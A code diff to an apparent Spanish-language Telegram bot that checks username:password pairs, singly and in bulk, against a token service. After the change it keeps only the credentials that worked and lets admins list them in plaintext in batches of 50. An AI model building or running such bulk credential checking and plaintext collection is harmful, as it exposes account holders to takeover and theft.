@@ -438,11 +438,18 @@ async def generar_token(event):
         await event.reply("❌ Formato incorrecto. Usa /token usuario:clave\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
         return
     usuario, clave = credenciales.split(":", 1)
+    # Verificamos si la clave contiene '%'
+    if "%" in clave:
+        await event.reply("Usuario Innacesible prueba otro")
+        return
     token = await obtener_token(usuario, clave)
     estado = "Exitoso✅" if token else "Fallido❌"
-    key = f"{usuario}:{clave}"
-    actividad[key] = {"usuario": usuario, "clave": clave, "token": token, "estado": estado}
-    guardar_actividad()
+    # Guardar en el historial solo si el token es exitoso (sin duplicados)
+    if token:
+        key = f"{usuario}:{clave}"
+        if key not in actividad:
+            actividad[key] = {"usuario": usuario, "clave": clave, "token": token, "estado": estado}
+            guardar_actividad()
     await event.reply(
         formatear_respuesta_token(usuario, clave, token, estado),
         buttons=crear_botones_urls(),
@@ -467,12 +474,20 @@ async def generar_tokens_masa(event):
             resultados.append(f"{cred} - Formato incorrecto ❌ \n\n /tokenmasa usuario1:clave1 | usuario2:clave2 | etc. ")
             continue
         usuario, clave = cred.split(":", 1)
+        # Si la contraseña contiene '%', la ignoramos
+        if "%" in clave:
+            resultados.append(f"`{usuario}:{clave}` - Usuario Innacesible prueba otro")
+            continue
         token = await obtener_token(usuario, clave)
-        estado = "Exitoso✅" if token else "Fallido❌"
-        key = f"{usuario}:{clave}"
-        actividad[key] = {"usuario": usuario, "clave": clave, "token": token, "estado": estado}
-        guardar_actividad()
-        resultados.append(f"`{usuario}:{clave}` - Token {estado}")
+        if token:
+            estado = "Exitoso✅"
+            key = f"{usuario}:{clave}"
+            if key not in actividad:
+                actividad[key] = {"usuario": usuario, "clave": clave, "token": token, "estado": estado}
+                guardar_actividad()
+            resultados.append(f"`{usuario}:{clave}` - Token {estado}")
+        else:
+            resultados.append(f"`{usuario}:{clave}` - Token Fallido❌")
     respuesta = "📋 Verificados Correctamente:\n" + "\n".join(resultados)
     await event.reply(respuesta + "\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 Asteriscom", parse_mode='markdown')
 
@@ -486,14 +501,21 @@ async def ver_historial(event):
     if username not in admins:
         await event.reply("❌ Este comando no existe, quizás /comandos \n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
         return
-    if actividad:
-        historial = "\n".join([
-            f"{i + 1}. ` {record['usuario']}:{record['clave']} ` - Token {record['estado']} {'' if record['estado'] == 'Exitoso✅' else ''}"
-            for i, record in enumerate(actividad.values())
-        ])
-        await event.reply(f"📋 Historial de credenciales:\n{historial}\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}", parse_mode='markdown')
-    else:
-        await event.reply("❌ No hay actividad registrada.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @Asteriscom")
+    # Filtrar solo los registros con token exitoso
+    registros = [
+        f"{i + 1}. ` {record['usuario']}:{record['clave']} ` - Token {record['estado']}"
+        for i, record in enumerate(actividad.values()) if record['estado'] == "Exitoso✅"
+    ]
+    if not registros:
+        await event.reply("❌ No hay actividad registrada con tokens exitosos.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}", parse_mode='markdown')
+        return
+    # Enviar en mensajes de 50 registros cada uno
+    chunk_size = 50
+    chunks = [registros[i:i+chunk_size] for i in range(0, len(registros), chunk_size)]
+    for idx, chunk in enumerate(chunks):
+        header = "📋 Historial de credenciales (Exitosas):\n" if idx == 0 else ""
+        mensaje = header + "\n".join(chunk) + f"\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}"
+        await event.reply(mensaje, parse_mode='markdown')
 
 # Limpiar historial (solo para administradores/CEO)
 @client.on(events.NewMessage(pattern=r'/limpiar'))
@@ -507,7 +529,7 @@ async def limpiar_historial(event):
         return
     actividad.clear()
     guardar_actividad()
-    await event.reply("🗑️ El historial de actividad ha sido limpiado.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @Asteriscom")
+    await event.reply("🗑️ El historial de actividad ha sido limpiado.\n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
 
 # ---------------- COMANDOS EXTRAS PARA ADMIN/CEO ----------------
 
@@ -519,7 +541,7 @@ async def listar_todos_comandos(event):
     sender = await event.get_sender()
     username = sender.username
     if username not in admins:
-        await event.reply("❌ Formato incorrecto. Usa /comandos \n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @Asteriscom")
+        await event.reply("❌ Formato incorrecto. Usa /comandos \n\n🏢 𝗦𝗼𝗹𝘂𝗰𝗶𝗼𝗻𝗲𝘀 𝗰𝗼𝗻 @{CEO_USER}")
         return
     mensaje = "📋 Comandos Globales (Admin):\n"
     if URLS:
@@ -626,12 +648,20 @@ async def manejar_comando(event):
     # Primero se revisa si el comando existe en los comandos globales (admin)
     if comando in URLS:
         datos = URLS[comando]
+        # Verificamos si la contraseña contiene '%'
+        if "%" in datos["clave"]:
+            await event.reply("Usuario Innacesible prueba otro")
+            return
         if username in admins or (username in permisos and permisos[username] > datetime.now()):
             token = await obtener_token(datos["usuario"], datos["clave"])
-            estado = "Exitoso✅" if token else "Fallido❌"
-            key = f"{datos['usuario']}:{datos['clave']}"
-            actividad[key] = {"usuario": datos["usuario"], "clave": datos["clave"], "token": token, "estado": estado}
-            guardar_actividad()
+            if token:
+                estado = "Exitoso✅"
+                key = f"{datos['usuario']}:{datos['clave']}"
+                if key not in actividad:
+                    actividad[key] = {"usuario": datos["usuario"], "clave": datos["clave"], "token": token, "estado": estado}
+                    guardar_actividad()
+            else:
+                estado = "Fallido❌"
             await event.reply(
                 formatear_respuesta_token(datos["usuario"], datos["clave"], token, estado),
                 buttons=crear_botones_urls(),
@@ -643,11 +673,18 @@ async def manejar_comando(event):
         # Luego se revisa si el comando está en los comandos personalizados del usuario
         if username in comandos_usuario and comando in comandos_usuario[username]:
             datos = comandos_usuario[username][comando]
+            if "%" in datos["clave"]:
+                await event.reply("Usuario Innacesible prueba otro")
+                return
             token = await obtener_token(datos["usuario"], datos["clave"])
-            estado = "Exitoso✅" if token else "Fallido❌"
-            key = f"{datos['usuario']}:{datos['clave']}"
-            actividad[key] = {"usuario": datos["usuario"], "clave": datos["clave"], "token": token, "estado": estado}
-            guardar_actividad()
+            if token:
+                estado = "Exitoso✅"
+                key = f"{datos['usuario']}:{datos['clave']}"
+                if key not in actividad:
+                    actividad[key] = {"usuario": datos["usuario"], "clave": datos["clave"], "token": token, "estado": estado}
+                    guardar_actividad()
+            else:
+                estado = "Fallido❌"
             await event.reply(
                 formatear_respuesta_token(datos["usuario"], datos["clave"], token, estado),
                 buttons=crear_botones_urls(),
@@ -674,3 +711,4 @@ cargar_datos()
 
 with client:
     client.loop.run_until_complete(main())
+
